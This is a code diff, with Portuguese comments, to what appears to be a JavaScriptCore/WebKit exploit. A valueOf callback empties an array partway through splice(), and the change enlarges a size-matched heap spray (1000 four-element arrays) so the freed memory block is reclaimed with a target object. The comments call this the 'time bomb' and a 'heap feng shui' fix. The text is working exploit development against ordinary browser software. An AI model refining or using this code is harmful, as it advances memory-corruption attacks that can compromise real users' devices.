@@ -19,21 +19,26 @@ export default {
 
         const self = this;
         
+        
         // 3. A Bomba Relógio
         this.evilObject = {
             valueOf: function() {
                 // O GATILHO: Encolhemos o array subjacente para 0
                 self.vulnArray.length = 0;
                 
-                // HEAP FENG SHUI: Agora que libertámos espaço, alocamos arrays contendo 
-                // a nossa Cobaia. A esperança é que um deles caia exatament ao lado
-                // do Butterfly do vulnArray.
+                // 🚨 FIX DO HEAP FENG SHUI (Size Class Matching) 🚨
+                // O vulnArray original tem tamanho 4.
+                // Vamos criar o spray com o tamanho exato de 4, forçando o bmalloc
+                // a reciclar o exato bloco de memória que acabamos de libertar!
                 self.targetSpray = [];
-                for(let i = 0; i < 200; i++) {
-                    self.targetSpray.push([self.targetObj]);
+                
+                // Aumentamos a densidade do spray de 200 para 1000 para inundar a Gaveta
+                for(let i = 0; i < 1000; i++) {
+                    // Preenchemos com a cobaia e "preenchimento" para imitar o tamanho original
+                    self.targetSpray.push([self.targetObj, 1.1, 2.2, 3.3]); 
                 }
                 
-                return 9.99; // O valor que o splice() vai tentar inserir
+                return 9.99; 
             }
         };
     },
